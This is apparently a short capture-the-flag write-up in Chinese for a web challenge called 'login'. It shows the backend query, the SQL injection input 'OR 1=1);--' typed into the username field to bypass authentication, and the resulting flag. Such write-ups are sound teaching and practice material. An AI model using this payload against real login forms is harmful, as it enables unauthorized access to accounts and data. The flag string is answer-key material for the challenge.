#Web 

## 題目

**login**
給了一個網址，點開來並點擊 `Magic`
![[W1-20_web.png|center|441]]

---
## 解題
1. 觀察網頁 -> 明顯是 SQL injection
   ```SQL
   SELECT * FROM admin WHERE (username='') AND (password='')
   ```
2. `Username` 輸入 `'OR 1=1);--'` 使查詢為
   ```SQL
   SELECT * FROM admin WHERE (username=''OR 1=1);--'') AND (password='')
   ```
3. flag = `CTF{login_b220ff451d540a08b5d2cc79}`













